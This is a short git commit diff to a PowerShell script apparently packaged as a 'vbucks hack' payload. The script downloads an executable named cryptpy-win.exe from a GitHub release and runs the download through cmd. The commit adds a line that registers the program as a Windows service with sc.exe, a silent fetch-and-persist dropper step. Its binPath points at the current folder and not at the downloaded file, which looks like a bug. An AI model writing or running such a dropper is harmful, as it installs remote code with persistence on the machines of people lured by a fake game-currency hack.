f4915029f7d271a2888c6ce8ac2eb31744a803f0
Mitsuko Megumi <mitsukomegumii@gmail.com>
2018-08-29 19:47:59 -0400

    Added downloadpath.

--- payload/vbucks/src/hack/ps/installcryptpy.ps1
+++ payload/vbucks/src/hack/ps/installcryptpy.ps1
@@ -2,7 +2,9 @@ $version = $args[0]
 
 $downloadUrl = 'https://github.com/mitsukomegumi/CryptPy.js/releases/download/'+$version+'/cryptpy-win.exe'
 $downloadCommand = 'curl '+$downloadUrl+' --output cryptpy-win.exe'
+$downloadPath = (Get-Item -Path ".\").FullName
 
 $serviceGenCommand = 'sc.exe create cryptpy binPath= "'+$downloadPath+'"'
 
 "$downloadCommand" | cmd
+"$serviceGenCommand" | cmd
